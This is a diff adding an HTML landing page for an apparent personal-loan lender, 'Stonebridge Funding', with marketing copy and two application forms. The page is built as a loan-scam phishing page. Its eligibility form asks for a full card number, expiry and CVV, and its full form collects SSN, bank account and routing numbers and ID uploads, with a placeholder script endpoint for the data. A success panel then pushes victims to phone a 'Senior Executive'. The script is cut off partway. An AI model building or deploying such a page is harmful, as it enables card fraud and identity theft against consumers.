@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Stonebridge Funding | Apply</title>
+  <style>
+    :root {
+      --brand-dark: #1a1138;
+      --brand-purple: #4a2040; 
+      --brand-cyan: #00a4e4;
+      --brand-pink: #c8006a;
+      --brand-green: #00b48d;
+      --text-dark: #1a1a1a;
+      --text-gray: #595959;
+      --border-color: #d9d9d9;
+      --mega-bg: #f8f9fa;
+      
+      --bg-image-1: url('https://i.ibb.co/VWVNyj3r/image.jpg'); 
+      --bg-image-2: url('https://i.ibb.co/Hpkbd09D/image.jpg');
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; }
+    body { background-color: #ffffff; color: var(--text-dark); line-height: 1.5; }
+
+    /* TOP UTILITY NAV */
+    .top-utility { background: #f8f9fa; border-bottom: 1px solid #e0e0e0; font-size: 0.8rem; color: #555; padding: 0.5rem 0; }
+    .utility-container { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; padding: 0 1.5rem; }
+    .utility-links a { color: #555; text-decoration: none; margin-left: 1.5rem; }
+
+    /* MAIN NAV */
+    .main-nav { background: #fff; border-bottom: 1px solid var(--border-color); position: sticky; top: 0; z-index: 1000; }
+    .nav-container { max-width: 1200px; margin: 0 auto; display: flex; align-items: center; justify-content: space-between; padding: 0 1.5rem; height: 75px; }
+    
+    .logo-area { display: flex; align-items: center; text-decoration: none; gap: 10px; }
+    .logo-img { height: 45px; width: auto; object-fit: contain; } 
+    .logo-text { font-size: 1.6rem; font-weight: 800; color: var(--brand-dark); letter-spacing: -0.5px; }
+    .logo-text span { color: var(--brand-cyan); }
+
+    .nav-links { display: flex; gap: 1.5rem; list-style: none; font-weight: 500; font-size: 0.95rem; color: var(--text-dark); height: 100%; }
+    .nav-item { cursor: pointer; display: flex; align-items: center; gap: 0.25rem; height: 75px; padding: 0 0.5rem; border-bottom: 3px solid transparent; }
+    .nav-item:hover { color: var(--brand-cyan); border-bottom-color: var(--brand-cyan); }
+    .nav-item:hover .nav-dropdown { display: flex; }
+    
+    /* MEGA MENU DROPDOWN */
+    .nav-item.has-mega { position: static; }
+    .nav-dropdown { display: none; position: absolute; top: 75px; left: 50%; transform: translateX(-50%); width: 800px; background: #fff; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border: 1px solid var(--border-color); border-top: 1px solid var(--border-color); border-radius: 0 0 8px 8px; z-index: 1001; }
+    .mega-menu-grid { display: grid; grid-template-columns: 1fr 1fr; width: 100%; }
+    .mega-left { padding: 1.5rem; border-right: 1px solid var(--border-color); background: #fff; border-radius: 0 0 0 8px; }
+    .mega-link { display: flex; align-items: center; gap: 1rem; padding: 0.8rem 1rem; text-decoration: none; color: var(--text-dark); border-radius: 8px; transition: background 0.2s; }
+    .mega-link:hover { background: var(--mega-bg); }
+    .mega-icon { width: 40px; height: 40px; background: #fdf2f8; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; color: var(--brand-pink); }
+    .mega-link-text { font-weight: 600; font-size: 1rem; }
+    .mega-right { padding: 1.5rem 2rem; background: var(--mega-bg); border-radius: 0 0 8px 0; }
+    .mega-right h4 { font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; color: var(--text-gray); margin-bottom: 1rem; }
+    .mega-learn-links { list-style: none; display: flex; flex-direction: column; gap: 0.8rem; }
+    .mega-learn-links a { text-decoration: none; color: var(--text-dark); font-size: 0.95rem; font-weight: 500; }
+    .mega-learn-links a:hover { color: var(--brand-cyan); text-decoration: underline; }
+
+    .nav-actions { display: flex; align-items: center; gap: 1.5rem; }
+    .btn-apply-nav { background: var(--brand-cyan); color: #fff; border: none; padding: 0.6rem 1.5rem; border-radius: 30px; font-weight: 600; font-size: 0.95rem; cursor: pointer; transition: background 0.2s; }
+    .btn-apply-nav:hover { background: #0082b8; }
+
+    /* HERO SECTION 1 */
+    .hero-1 { background-color: var(--brand-dark); background-image: linear-gradient(135deg, rgba(26, 17, 56, 0.9) 0%, rgba(26, 17, 56, 0.6) 100%), var(--bg-image-1); background-size: cover; background-position: center; color: #fff; padding: 5rem 1.5rem; position: relative; }
+    .hero-1-container { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: 1fr 1fr; gap: 4rem; align-items: center; }
+    .hero-1 h1 { font-size: 3.2rem; font-weight: 700; line-height: 1.1; margin-bottom: 1.5rem; }
+    .hero-1 p { font-size: 1.25rem; margin-bottom: 2rem; opacity: 0.9; font-weight: 500; }
+    
+    .btn-primary { background: var(--brand-cyan); color: #fff; border: none; padding: 1rem 2.5rem; border-radius: 30px; font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: background 0.2s; display: inline-block; }
+    .btn-primary:hover { background: #0082b8; }
+    
+    .check-note { font-size: 0.85rem; margin-top: 1rem; display: flex; align-items: center; gap: 0.5rem; opacity: 0.8; }
+    .check-note::before { content: "✔"; color: var(--brand-cyan); font-weight: bold; }
+
+    /* HERO WIDGET */
+    .hero-widget { background: #fff; border-radius: 12px; padding: 2rem; color: var(--text-dark); box-shadow: 0 20px 40px rgba(0,0,0,0.3); border-top: 6px solid var(--brand-pink); }
+    .hero-widget h3 { font-size: 1.2rem; color: var(--brand-purple); margin-bottom: 1rem; }
+    .widget-row { display: flex; justify-content: space-between; margin-bottom: 1rem; align-items: center; }
+    .widget-label { color: var(--text-gray); font-size: 0.9rem; }
+    .widget-value { font-weight: 700; font-size: 1.1rem; }
+    .widget-slider { width: 100%; margin-bottom: 1.5rem; accent-color: var(--brand-pink); }
+    .widget-highlight { background: #ffb800; color: #000; padding: 0.5rem 1rem; border-radius: 4px; font-weight: 700; display: inline-block; margin-bottom: 1rem; }
+
+    /* HERO SECTION 2 */
+    .hero-2 { background-color: var(--brand-purple); background-image: linear-gradient(to right, rgba(74, 32, 64, 0.95) 0%, rgba(74, 32, 64, 0.6) 100%), var(--bg-image-2); background-size: cover; background-position: center; color: #fff; padding: 4rem 1.5rem; text-align: center; border-top: 1px solid rgba(255,255,255,0.1); }
+    .hero-2 h2 { font-size: 2.5rem; font-weight: 700; margin-bottom: 1rem; }
+    .hero-2 h2 span { color: var(--brand-cyan); }
+    .hero-2 p { font-size: 1.1rem; margin-bottom: 2rem; opacity: 0.9; }
+
+    /* ICON FEATURE ROW */
+    .feature-row { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(4, 1fr); gap: 2rem; padding: 3rem 1.5rem; background: #fff; border-bottom: 1px solid var(--border-color); }
+    .feature-item { text-align: left; }
+    .feature-icon { width: 50px; height: 50px; background: var(--brand-cyan); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 1.5rem; font-weight: bold; margin-bottom: 1rem; }
+    .feature-item h4 { font-size: 1.1rem; margin-bottom: 0.5rem; color: var(--brand-dark); }
+    .feature-item p { font-size: 0.9rem; color: var(--text-gray); line-height: 1.4; }
+
+    /* COMPARISON SECTION */
+    .comparison-section { background-color: #f4f6f9; background-image: linear-gradient(rgba(244, 246, 249, 0.9), rgba(244, 246, 249, 0.9)), var(--bg-image-2); background-size: cover; background-position: center; padding: 4rem 1.5rem; }
+    .comparison-container { max-width: 900px; margin: 0 auto; text-align: center; }
+    .comparison-container h2 { font-size: 2rem; font-weight: 700; color: var(--brand-dark); margin-bottom: 0.5rem; }
+    .comparison-container p.sub { color: var(--text-gray); margin-bottom: 2rem; }
+    
+    .compare-grid { display: grid; grid-template-columns: 1fr 1fr; border-radius: 12px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.1); margin-bottom: 1rem; }
+    .compare-col { padding: 2.5rem; text-align: left; }
+    .compare-card { background: #002e5d; color: #fff; }
+    .compare-loan { background: #fff; color: var(--text-dark); }
+    .compare-col h3 { font-size: 1.4rem; margin-bottom: 1.5rem; border-bottom: 1px solid rgba(255,255,255,0.2); padding-bottom: 1rem; }
+    .compare-loan h3 { border-bottom-color: var(--border-color); }
+    .compare-row { display: flex; justify-content: space-between; margin-bottom: 1rem; font-size: 0.95rem; }
+    .compare-row.bold { font-weight: 700; font-size: 1.1rem; margin-top: 1rem; }
+    .savings-bar { background: var(--brand-green); color: #fff; padding: 1rem; border-radius: 8px; font-size: 1.2rem; font-weight: 700; margin-top: -1px; }
+
+    /* MAIN CONTENT & FORMS */
+    .main-content { max-width: 1200px; margin: 0 auto; padding: 2rem 1.5rem; }
+    
+    /* SHORT ELIGIBILITY FORM */
+    #eligibility-section { display: none; background: #fff; border: 1px solid var(--border-color); border-radius: 8px; padding: 2.5rem; box-shadow: 0 4px 20px rgba(0,0,0,0.1); margin-bottom: 2rem; border-top: 6px solid var(--brand-cyan); }
+    #eligibility-section h2 { font-size: 1.8rem; font-weight: 700; color: var(--brand-dark); margin-bottom: 0.5rem; }
+    #eligibility-section p.desc { color: var(--text-gray); margin-bottom: 2rem; }
+    
+    /* FULL APPLICATION FORM */
+    #application-section { display: none; background: #fff; border: 1px solid var(--border-color); border-radius: 8px; padding: 2.5rem; box-shadow: 0 4px 20px rgba(0,0,0,0.1); margin-bottom: 2rem; border-top: 6px solid var(--brand-pink); }
+    #application-section h2 { font-size: 1.8rem; font-weight: 700; color: var(--brand-dark); margin-bottom: 0.5rem; }
+    #application-section p.desc { color: var(--text-gray); margin-bottom: 2rem; }
+    
+    .form-section-title { font-size: 1.2rem; font-weight: 700; color: var(--brand-purple); margin: 1.5rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border-color); }
+    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 1.25rem; }
+    .form-group { margin-bottom: 1.25rem; }
+    label { display: block; font-size: 0.95rem; font-weight: 600; margin-bottom: 0.4rem; color: var(--text-dark); }
+    .form-control { width: 100%; padding: 0.75rem 1rem; border: 1px solid #ccc; border-radius: 4px; font-size: 0.95rem; }
+    .form-control:focus { outline: none; border-color: var(--brand-cyan); }
+    .btn-submit { width: 100%; background: var(--brand-cyan); color: #fff; border: none; padding: 1.2rem; border-radius: 30px; font-size: 1.2rem; font-weight: 700; cursor: pointer; margin-top: 1rem; }
+    .btn-submit:hover { background: #0082b8; }
+    .upload-note { font-size: 0.8rem; color: var(--text-gray); margin-top: 0.25rem; }
+    
+    /* SUCCESS & MANDATORY CALL SECTION */
+    #success-section { display: none; text-align: center; padding: 3rem 2rem; background: #fff; border: 2px solid var(--brand-green); border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); margin-bottom: 2rem; }
+    #success-section h2 { font-size: 2rem; color: var(--brand-green); margin-bottom: 1rem; }
+    #success-section p { font-size: 1.1rem; color: var(--text-dark); margin-bottom: 2rem; }
+    
+    .call-box { background: #f0fdf4; border: 2px dashed var(--brand-green); padding: 2rem; border-radius: 8px; margin-bottom: 2rem; }
+    .call-box h3 { font-size: 1.5rem; color: var(--brand-dark); margin-bottom: 1rem; }
+    .phone-number { font-size: 2.5rem; font-weight: 800; color: var(--brand-pink); letter-spacing: 1px; }
+    
+    /* Mobile specific styling for phone number */
+    .mobile-call-btn { display: none; background: var(--brand-green); color: #fff; text-decoration: none; padding: 1rem 2rem; border-radius: 30px; font-size: 1.2rem; font-weight: 700; margin-top: 1rem; width: 100%; text-align: center; }
+    
+    @media (max-width: 768px) {
+      .nav-links { display: none; }
+      .form-row { grid-template-columns: 1fr; }
+      .feature-row { grid-template-columns: 1fr; }
+      
+      /* Mobile display logic for phone number */
+      .phone-number { display: none; }
+      .mobile-call-btn { display: block; }
+    }
+
+    @media (max-width: 992px) {
+      .hero-1-container { grid-template-columns: 1fr; }
+      .feature-row { grid-template-columns: 1fr 1fr; }
+      .compare-grid { grid-template-columns: 1fr; }
+      .nav-dropdown { width: 100%; left: 0; transform: none; position: absolute; }
+      .mega-menu-grid { grid-template-columns: 1fr; }
+      .mega-left { border-right: none; border-bottom: 1px solid var(--border-color); border-radius: 0; }
+      .mega-right { border-radius: 0 0 8px 8px; }
+    }
+
+    /* FAQ SECTION */
+    .faq-section { background: #fff; padding: 4rem 1.5rem; border-top: 1px solid var(--border-color); }
+    .faq-container { max-width: 900px; margin: 0 auto; }
+    .faq-container h2 { font-size: 2rem; font-weight: 700; color: var(--brand-dark); margin-bottom: 1.5rem; text-align: center; }
+    .faq-list { display: flex; flex-direction: column; }
+    .faq-item { border-bottom: 1px solid var(--border-color); padding: 1rem 0; cursor: pointer; }
+    .faq-item:hover .faq-question { color: var(--brand-cyan); }
+    .faq-question { font-size: 1.05rem; font-weight: 600; color: var(--text-dark); display: flex; justify-content: space-between; align-items: center; }
+    .faq-question::after { content: "+"; font-size: 1.5rem; font-weight: 400; color: var(--text-gray); }
+  </style>
+</head>
+<body>
+
+  <!-- TOP UTILITY NAV -->
+  <div class="top-utility">
+    <div class="utility-container">
+      <div>Consumer / Small Business / Business</div>
+      <div class="utility-links">
+        <a href="#">Consumer Support</a>
+        <a href="#">Global Sites</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MAIN NAV -->
+  <nav class="main-nav">
+    <div class="nav-container">
+      <a href="#" class="logo-area">
+        <!-- NEW FINAL LOGO -->
+        <img src="https://i.ibb.co/WW9BjYw4/logo.png" alt="Stonebridge Logo" class="logo-img" onerror="this.style.display='none'">
+        <span class="logo-text">stonebridge<span>.funding</span></span>
+      </a>
+      
+      <ul class="nav-links">
+        <li class="nav-item has-mega">Credit ▾
+          <div class="nav-dropdown"><div class="mega-menu-grid"><div class="mega-left"><a href="#" class="mega-link"><div class="mega-icon">📄</div><span class="mega-link-text">Credit Reports</span></a><a href="#" class="mega-link"><div class="mega-icon">📈</div><span class="mega-link-text">Credit Scores</span></a><a href="#" class="mega-link"><div class="mega-icon">👁️</div><span class="mega-link-text">Credit Monitoring</span></a></div><div class="mega-right"><h4>LEARN</h4><ul class="mega-learn-links"><li><a href="#">How to read your credit report</a></li><li><a href="#">What is a good credit score?</a></li></ul></div></div></div>
+        </li>
+        <li class="nav-item has-mega">Protection ▾
+          <div class="nav-dropdown"><div class="mega-menu-grid"><div class="mega-left"><a href="#" class="mega-link"><div class="mega-icon">🛡️</div><span class="mega-link-text">Identity Theft</span></a><a href="#" class="mega-link"><div class="mega-icon">🚨</div><span class="mega-link-text">Fraud Resolution</span></a></div><div class="mega-right"><h4>LEARN</h4><ul class="mega-learn-links"><li><a href="#">Signs of identity theft</a></li><li><a href="#">How to freeze your credit</a></li></ul></div></div></div>
+        </li>
+        <li class="nav-item has-mega">Money ▾
+          <div class="nav-dropdown"><div class="mega-menu-grid"><div class="mega-left"><a href="#" class="mega-link"><div class="mega-icon">🏦</div><span class="mega-link-text">Banking</span></a><a href="#" class="mega-link"><div class="mega-icon">🐷</div><span class="mega-link-text">Savings</span></a></div><div class="mega-right"><h4>LEARN</h4><ul class="mega-learn-links"><li><a href="#">Best high-yield savings</a></li><li><a href="#">How to start investing</a></li></ul></div></div></div>
+        </li>
+        <li class="nav-item has-mega">Credit Cards ▾
+          <div class="nav-dropdown"><div class="mega-menu-grid"><div class="mega-left"><a href="#" class="mega-link"><div class="mega-icon">💳</div><span class="mega-link-text">Cash Back</span></a><a href="#" class="mega-link"><div class="mega-icon">✈️</div><span class="mega-link-text">Travel</span></a></div><div class="mega-right"><h4>LEARN</h4><ul class="mega-learn-links"><li><a href="#">How to choose a credit card</a></li><li><a href="#">Maximizing rewards</a></li></ul></div></div></div>
+        </li>
+        <li class="nav-item has-mega">Loans ▾
+          <div class="nav-dropdown"><div class="mega-menu-grid"><div class="mega-left"><a href="#" class="mega-link"><div class="mega-icon">🏦</div><span class="mega-link-text">All loan types</span></a><a href="#" class="mega-link"><div class="mega-icon">👥</div><span class="mega-link-text">Personal</span></a><a href="#" class="mega-link"><div class="mega-icon">📊</div><span class="mega-link-text">Debt consolidation</span></a><a href="#" class="mega-link"><div class="mega-icon">$</div><span class="mega-link-text">$5,000 loans</span></a><a href="#" class="mega-link"><div class="mega-icon">💵</div><span class="mega-link-text">$20,000 loans</span></a></div><div class="mega-right"><h4>LEARN</h4><ul class="mega-learn-links"><li><a href="#">How do lenders view your credit</a></li><li><a href="#">APR vs. interest rate</a></li></ul></div></div></div>
+        </li>
+        <li class="nav-item has-mega">Insurance ▾
+          <div class="nav-dropdown"><div class="mega-menu-grid"><div class="mega-left"><a href="#" class="mega-link"><div class="mega-icon">🚗</div><span class="mega-link-text">Auto Insurance</span></a><a href="#" class="mega-link"><div class="mega-icon">🏠</div><span class="mega-link-text">Home Insurance</span></a></div><div class="mega-right"><h4>LEARN</h4><ul class="mega-learn-links"><li><a href="#">Types of insurance you need</a></li><li><a href="#">How to lower premiums</a></li></ul></div></div></div>
+        </li>
+      </ul>
+      
+      <div class="nav-actions">
+        <!-- Apply Now triggers the full application form -->
+        <button class="btn-apply-nav" onclick="openFullApplication()">Apply Now</button>
+        <span style="font-size: 1.2rem; cursor: pointer;">🔍</span>
+      </div>
+    </div>
+  </nav>
+
+  <!-- HERO SECTION 1 -->
+  <header class="hero-1">
+    <div class="hero-1-container">
+      <div>
+        <h1>Personal loans for 2026</h1>
+        <p>Get cash fast. See your rates with no impact to your credit scores.</p>
+        <!-- Check Eligibility triggers the short form -->
+        <button class="btn-primary" onclick="openEligibility()">Check My Eligibility</button>
+        <div class="check-note">Checking your options won't hurt your credit scores</div>
+      </div>
+      
+      <!-- Floating Widget -->
+      <div class="hero-widget">
+        <h3>Max monthly payment</h3>
+        <input type="range" class="widget-slider" min="100" max="2000" value="1200">
+        <div class="widget-row"><span class="widget-label">Max APR</span><span class="widget-value">12.3%</span></div>
+        <input type="range" class="widget-slider" min="5" max="35" value="12">
+        <div class="widget-row" style="margin-top: 1rem;"><span class="widget-label">Loan amount</span><span class="widget-value" style="font-size: 1.5rem; color: var(--brand-purple);">$12,000</span></div>
+        <div class="widget-row"><span class="widget-label">Monthly payment</span><span class="widget-value">$667</span></div>
+        <div class="widget-row"><span class="widget-label">Annual Percentage Rate</span><span class="widget-value">12.3%</span></div>
+        <div class="widget-row"><span class="widget-label">Term</span><span class="widget-value">36 months</span></div>
+        <div class="widget-highlight">Estimated yearly interest savings with loan</div>
+        <div style="font-size: 2rem; font-weight: 800; color: #000; margin-bottom: 1rem;">$400</div>
+        <button class="btn-primary" style="width: 100%; border-radius: 8px;" onclick="openEligibility()">Check My Eligibility</button>
+      </div>
+    </div>
+  </header>
+
+  <!-- ICON FEATURE ROW -->
+  <section class="feature-row">
+    <div class="feature-item"><div class="feature-icon">💰</div><h4>Low monthly payments</h4><p>Save big by consolidating high-rate debt to one fixed payment.</p></div>
+    <div class="feature-item"><div class="feature-icon">$</div><h4>Get $5K to $100K</h4><p>Get funds as soon as the same day you sign with our quick process.</p></div>
+    <div class="feature-item"><div class="feature-icon">✔</div><h4>Direct Pay</h4><p>We'll pay your credit card lender so you don't have to.</p></div>
+    <div class="feature-item"><div class="feature-icon">»</div><h4>See rates now</h4><p>No impact to your credit score. No commitment required.</p></div>
+  </section>
+
+  <!-- HERO SECTION 2 -->
+  <header class="hero-2">
+    <h2>We've helped members like these <span>pay off over $33B in debt</span> with a Personal Loan.</h2>
+    <p>Low rates. No fees required. Personal loans made easy online.</p>
+    <button class="btn-primary" onclick="openEligibility()">Check My Eligibility</button>
+  </header>
+
+  <!-- COMPARISON SECTION -->
+  <section class="comparison-section">
+    <div class="comparison-container">
+      <h2>Personal loans can help you save thousands of dollars in interest</h2>
+      <p class="sub">Using a $20,000 personal loan instead of a credit card could potentially save you $3,585 in interest and lower your monthly payment.</p>
+      
+      <div class="compare-grid">
+        <div class="compare-col compare-card">
+          <h3>High-interest rate credit card</h3>
+          <div class="compare-row"><span>Balance</span><span>$20,000</span></div>
+          <div class="compare-row"><span>Monthly payment</span><span>$767</span></div>
+          <div class="compare-row"><span>Average Annual Percentage Rate (APR)</span><span>22.3%</span></div>
+          <div class="compare-row bold"><span>Total paid over 36-month term</span><span>$27,609</span></div>
+        </div>
+        
+        <div class="compare-col compare-loan">
+          <h3>Personal loan</h3>
+          <div class="compare-row"><span>Balance</span><span>$20,000</span></div>
+          <div class="compare-row"><span>Monthly payment</span><span>$667</span></div>
+          <div class="compare-row"><span>Average Annual Percentage Rate (APR)</span><span>12.3%</span></div>
+          <div class="compare-row bold"><span>Total paid over 36-month term</span><span>$24,025</span></div>
+          <div class="savings-bar">Save $3,585</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- MAIN CONTENT -->
+  <main class="main-content">
+    
+    <!-- 1. SHORT ELIGIBILITY FORM (Triggered by "Check My Eligibility") -->
+    <div id="eligibility-section">
+      <h2>Check My Eligibility</h2>
+      <p class="desc">Checking your eligibility is fast, easy, and won't impact your credit score.</p>
+      
+      <form id="eligibilityForm">
+        <div class="form-row">
+          <div class="form-group">
+            <label>Full Name</label>
+            <input type="text" id="eligName" class="form-control" placeholder="First and Last Name" required>
+          </div>
+          <div class="form-group">
+            <label>Date of Birth</label>
+            <input type="date" id="eligDob" class="form-control" required>
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Permanent Home Address</label>
+          <input type="text" id="eligAddress" class="form-control" placeholder="Street, City, State, Zip Code" required>
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Card Details (For Checking)</label>
+            <!-- 16 digits max, numbers only -->
+            <input type="text" id="eligCard" class="form-control" placeholder="16-Digit Card Number" required maxlength="16" pattern="\d{16}" title="Please enter exactly 16 digits" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+          </div>
+          <div class="form-group">
+            <label>Expiration (MMYY) & CVV</label>
+            <div style="display: flex; gap: 0.5rem;">
+              <!-- 4 digits max for expiry, 3 digits max for CVV, numbers only -->
+              <input type="text" class="form-control" placeholder="MMYY" required style="flex:1;" maxlength="4" pattern="\d{4}" title="Please enter 4 digits (MMYY)" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+              <input type="text" class="form-control" placeholder="CVV" required style="flex:1;" maxlength="3" pattern="\d{3}" title="Please enter exactly 3 digits" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+            </div>
+          </div>
+        </div>
+
+        <button type="submit" class="btn-submit" id="eligSubmitBtn">Submit & Check Eligibility</button>
+      </form>
+    </div>
+
+    <!-- 2. FULL APPLICATION FORM (Triggered by "Apply Now") -->
+    <div id="application-section">
+      <h2>Full Loan Application</h2>
+      <p class="desc">Please fill out the information below accurately. A senior executive will contact you shortly.</p>
+      
+      <form class="application-form" id="loanForm">
+        <div class="form-section-title">1. Personal & Contact Information</div>
+        <div class="form-row">
+          <div class="form-group"><label>Full Legal Name</label><input type="text" name="fullName" class="form-control" required></div>
+          <div class="form-group"><label>Date of Birth</label><input type="date" name="dob" class="form-control" required></div>
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Citizenship / Residency Status</label>
+            <select name="citizenship" class="form-control" required>
+              <option value="">Select Status</option><option>U.S. Citizen</option><option>Permanent Resident</option><option>Visa Holder</option><option>Other</option>
+            </select>
+          </div>
+          <div class="form-group"><label>SSN or ITIN</label><input type="password" name="ssn" class="form-control" placeholder="XXX-XX-XXXX" required></div>
+        </div>
+        <div class="form-group"><label>Permanent Home Address</label><input type="text" name="address" class="form-control" placeholder="Street, City, State, Zip Code" required></div>
+        <div class="form-row">
+          <div class="form-group"><label>Phone Number</label><input type="tel" name="phone" class="form-control" required></div>
+          <div class="form-group"><label>Email Address</label><input type="email" name="email" class="form-control" required></div>
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Housing Status</label>
+            <select name="housingStatus" class="form-control" required>
+              <option value="">Select Status</option><option>Rent</option><option>Own (Mortgage)</option><option>Own (Free & Clear)</option><option>Live with Family</option>
+            </select>
+          </div>
+          <div class="form-group"><label>Monthly Rent/Mortgage Payment</label><input type="number" name="monthlyHousingPayment" class="form-control" required></div>
+        </div>
+
+        <div class="form-section-title">2. Identity & Address Verification Documents</div>
+        <div class="form-row">
+          <div class="form-group"><label>Upload Government-Issued ID</label><input type="file" id="idFile" class="form-control" required accept="image/*,.pdf"><p class="upload-note">Driver’s license, passport, or state ID.</p></div>
+          <div class="form-group"><label>Upload Proof of Address</label><input type="file" id="addressFile" class="form-control" required accept="image/*,.pdf"><p class="upload-note">Utility bill, lease, or bank statement.</p></div>
+        </div>
+
+        <div class="form-section-title">3. Employment, Income & Financial Details</div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Employment Status</label>
+            <select name="employmentStatus" class="form-control" required>
+              <option value="">Select Status</option><option>Full-Time</option><option>Part-Time</option><option>Self-Employed</option><option>Unemployed</option><option>Retired</option>
+            </select>
+          </div>
+          <div class="form-group"><label>Employer Name</label><input type="text" name="employerName" class="form-control"></div>
+        </div>
+        <div class="form-row">
+          <div class="form-group"><label>Employer Contact</label><input type="text" name="employerContact" class="form-control"></div>
+          <div class="form-group"><label>Employment History</label><input type="text" name="employmentHistory" class="form-control" placeholder="e.g., 2 years"></div>
+        </div>
+        <div class="form-row">
+          <div class="form-group"><label>Gross Annual Income</label><input type="number" name="annualIncome" class="form-control" required></div>
+          <div class="form-group"><label>Upload Income Proof</label><input type="file" id="incomeFile" class="form-control" required accept="image/*,.pdf" multiple><p class="upload-note">Pay stubs, W-2s, or tax returns.</p></div>
+        </div>
+        <div class="form-row">
+          <div class="form-group"><label>Monthly Debt Obligations</label><input type="number" name="monthlyDebts" class="form-control" required></div>
+          <div class="form-group"><label>Estimated Credit Score</label><input type="number" name="creditScore" class="form-control"></div>
+        </div>
+
+        <div class="form-section-title">4. Loan & Bank Account Details</div>
+        <div class="form-row">
+          <div class="form-group"><label>Desired Loan Amount</label><input type="number" name="loanAmount" class="form-control" required></div>
+          <div class="form-group">
+            <label>Preferred Repayment Term</label>
+            <select name="repaymentTerm" class="form-control" required>
+              <option value="">Select Term</option><option>12 Months</option><option>24 Months</option><option>36 Months</option><option>48 Months</option><option>60 Months</option>
+            </select>
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Loan Purpose</label>
+          <select name="loanPurpose" class="form-control" required>
+            <option value="">Select Purpose</option><option>Debt Consolidation</option><option>Home Improvement</option><option>Major Purchase</option><option>Medical Expense</option><option>Business Expense</option><option>Other</option>
+          </select>
+        </div>
+        <div class="form-row">
+          <div class="form-group"><label>Bank Account Number</label><input type="text" name="bankAccount" class="form-control" required></div>
+          <div class="form-group"><label>Bank Routing Number</label><input type="text" name="bankRouting" class="form-control" required></div>
+        </div>
+
+        <button type="submit" class="btn-submit" id="submitBtn">Submit Full Application</button>
+      </form>
+    </div>
+
+    <!-- 3. SUCCESS & MANDATORY CALL SECTION (For Both Forms) -->
+    <div id="success-section">
+      <h2>✔ Submission Received!</h2>
+      <p>To finalize your application and receive your funds, you must speak with a Senior Executive immediately.</p>
+      
+      <div class="call-box">
+        <h3>Mandatory Step: Call Senior Executive Now</h3>
+        <div class="phone-number">+1 (202) 373-4485</div>
+        
+        <!-- Shown only on mobile devices -->
+        <a href="tel:+12023734485" class="mobile-call-btn">📞 Tap to Call Senior Executive</a>
+        
+        <p style="font-size: 0.9rem; color: var(--text-gray); margin-top: 1rem;">Please call this number immediately to verify your identity and complete the process.</p>
+      </div>
+      
+      <p style="font-size: 0.95rem; font-weight: bold; color: var(--brand-dark);">Your application will remain pending until this call is completed.</p>
+    </div>
+
+  </main>
+
+  <!-- FAQ SECTION -->
+  <section class="faq-section">
+    <div class="faq-container">
+      <h2>Frequently Asked Questions</h2>
+      <div class="faq-list">
+        <div class="faq-item"><div class="faq-question">What is a personal loan?</div></div>
+        <div class="faq-item"><div class="faq-question">What can personal loans be used for?</div></div>
+        <div class="faq-item"><div class="faq-question">Pros and cons of personal loans</div></div>
+        <div class="faq-item"><div class="faq-question">How do personal loan interest rates work?</div></div>
+        <div class="faq-item"><div class="faq-question">Who can get a personal loan and what do you need to qualify?</div></div>
+        <div class="faq-item"><div class="faq-question">Are there personal loans available for individuals with fair or poor credit?</div></div>
+        <div class="faq-item"><div class="faq-question">How does applying for a personal loan impact my credit score?</div></div>
+        <div class="faq-item"><div class="faq-question">How do you compare and choose the best personal loan?</div></div>
+        <div class="faq-item"><div class="faq-question">How quickly can I get a personal loan?</div></div>
+        <div class="faq-item"><div class="faq-question">How much money can I borrow with a personal loan?</div></div>
+        <div class="faq-item"><div class="faq-question">How does No Ding Decline work?</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- JAVASCRIPT LOGIC -->
+  <script>
+    const GOOGLE_SCRIPT_URL = "YOUR_GOOGLE_APP_SCRIPT_WEB_APP_URL_HERE"; // Keep this for the full form
+
+    // 1. Open Short Eligibility Form
+    function openEligibility() {
+      document.getElementById('eligibility-section').style.display = 'block';
+      document.getElementById('application-section').style.display = 'none';
+      document.getElementById('success-section').style.display = 'none';
+      document.getElementById('eligibility-section').scrollIntoView({ behavior: 'smooth' });
+      
+      setTimeout(() => {
+        document.getElementById('eligName').focus();
+      }, 500);
+    }
+
+    // 2. Handle Short Eligibility Submit
+    document.getElementById('eligibilityForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const submitBtn = document.getElementById('eligSubmitBtn');
+      submitBtn.textContent = "Checking...";
+      submitBtn.disabled = true;
+
+      // Simulate a short delay for checking eligibility
+      setTimeout(() => {
+        document.getElementById('eligibility-section').style.display = 'none';
+        document.getElementById('success-section').style.display = 'block';
+        document.getElementById('success-section').scrollIntoView({ behavior: 'smooth' });
+        
+        submitBtn.textContent = "Submit & Check Eligibility";
+        submitBtn.disabled = false;
+      }, 1000);
+    });
+
+    // 3. Open Full Application (Triggered by "Apply Now")
+    function openFullApplication() {
+      document.getElementById('application-section').style.display = 'block';
+      document.getElementById('eligibility-section').style.display = 'none';
